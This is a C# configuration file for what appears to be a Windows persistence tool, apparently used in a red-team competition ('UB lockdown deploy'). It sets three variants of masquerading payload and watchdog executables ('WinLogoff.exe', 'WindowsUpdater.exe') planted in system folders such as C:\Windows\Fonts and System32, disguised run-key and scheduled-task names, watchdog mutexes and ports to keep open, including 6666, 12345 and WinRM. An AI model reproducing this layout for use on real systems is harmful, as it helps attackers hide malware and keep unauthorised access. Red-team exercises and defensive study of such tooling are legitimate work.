
public class Config // This is for Binary 1
{
    public static bool Debugging { get; private set; } = false; //Set to true for debugging messages and logs
    public static int sleepTime { get; private set; } = 46000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
                                                               // used 46 seconds for UB lockdown deploy. Lower time increases the strength of the persistence
    public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 6666, 8888, 12345, 5985, 5986 }; // Ports to keep open

    public static string RunKeyName { get; private set; } = "Network Information Service";
    public static string ScheduledTaskName { get; private set; } = "IndexSearch";



    public static string PayloadPath { get; private set; } = @"C:\Windows\"; // This will be created if it doesnt already exist
    public static string PayloadName { get; private set; } = "WinLogoff.exe";
    public static string PayloadFullPath { get; private set; } = Path.Combine(PayloadPath, PayloadName);




    public static string SecondaryWatchdogPath { get; private set; } = @"C:\Windows\System32\"; // This will be created if it doesnt already exist
    public static string SecondaryWatchdogName { get; private set; } = "WinSearchIndexer.exe";
    public static string SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDog";
    public static string SecondaryWatchdogFullPath { get; private set; } = Path.Combine(SecondaryWatchdogPath, SecondaryWatchdogName);


    public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\Fonts\"; // CRUCIAL: This is the foler you will be put both watchdogs and the payload into
    public static string PrimaryWatchdogName { get; private set; } = "Windows Service Scheduler.exe";
    public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDog";
    public static string PrimaryWatchdogFullPath { get; private set; } = Path.Combine(PrimaryWatchdogPath, PrimaryWatchdogName);
}


/*





public class Config // This is for payload 2
{
    // Put the config at the top of this file that you want to run. the commented out one should be below for the powershell script
    public static bool Debugging { get; private set; } = false; //Set to true for debugging messages and logs, to make the terminal show up, please change .csproj under both projects to compile to an "exe" instead of "winexe"
                                                                // Basically: Winexe = No Window Created , Exe = Windowed Console App

    public static int sleepTime { get; private set; } = 40000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
                                                               // used 46 seconds for UB lockdown deploy. Lower time increases the strength of the persistence

    public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 6666, 8888, 12345, 5985, 5986 }; // Ports to keep open


    public static string RunKeyName { get; private set; } = "WindowsCritical";
    public static string ScheduledTaskName { get; private set; } = "DiskDefragment";


    public static string PayloadPath { get; private set; } = @"C:\Windows\"; // This will be created if it doesnt already exist
    public static string PayloadName { get; private set; } = "SysLoad.exe";
    public static string PayloadFullPath { get; private set; } = Path.Combine(PayloadPath, PayloadName);




    public static string SecondaryWatchdogPath { get; private set; } = @"C:\Windows\SystemApps\"; // This will be created if it doesnt already exist
    public static string SecondaryWatchdogName { get; private set; } = "Windows Disk Management.exe";
    public static string SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDogBin2";
    public static string SecondaryWatchdogFullPath { get; private set; } = Path.Combine(SecondaryWatchdogPath, SecondaryWatchdogName);


    public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\SysWOW64\"; // CRUCIAL: This is the foler you will be put both watchdogs and the payload into
    public static string PrimaryWatchdogName { get; private set; } = "WinCore.exe";
    public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDogBin2";
    public static string PrimaryWatchdogFullPath { get; private set; } = Path.Combine(PrimaryWatchdogPath, PrimaryWatchdogName);
}






public class Config // This is for payload 3
{
    // Put the config at the top of this file that you want to run. the commented out one should be below for the powershell script
    public static bool Debugging { get; private set; } = false; //Set to true for debugging messages and logs, to make the terminal show up, please change .csproj under both projects to compile to an "exe" instead of "winexe"
                                                                // Basically: Winexe = No Window Created , Exe = Windowed Console App

    public static int sleepTime { get; private set; } = 52000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
                                                               // used 46 seconds for UB lockdown deploy. Lower time increases the strength of the persistence

    public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 6666, 8888, 12345, 5985, 5986  }; // Ports to keep open


    public static string RunKeyName { get; private set; } = "Windows Service Initializer";
    public static string ScheduledTaskName { get; private set; } = "Wireless Network Optimization";


    public static string PayloadPath { get; private set; } = @"C:\Windows\"; // This will be created if it doesnt already exist
    public static string PayloadName { get; private set; } = "Windows License Monitor.exe";
    public static string PayloadFullPath { get; private set; } = Path.Combine(PayloadPath, PayloadName);




    public static string SecondaryWatchdogPath { get; private set; } = @"C:\Windows\assembly\"; // This will be created if it doesnt already exist
    public static string SecondaryWatchdogName { get; private set; } = "WinLogin.exe";
    public static string SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDogBin3";
    public static string SecondaryWatchdogFullPath { get; private set; } = Path.Combine(SecondaryWatchdogPath, SecondaryWatchdogName);


    public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\SystemApps\"; // CRUCIAL: This is the foler you will be put both watchdogs and the payload into
    public static string PrimaryWatchdogName { get; private set; } = "WindowsUpdater.exe";
    public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDogBin3";
    public static string PrimaryWatchdogFullPath { get; private set; } = Path.Combine(PrimaryWatchdogPath, PrimaryWatchdogName);
}











*/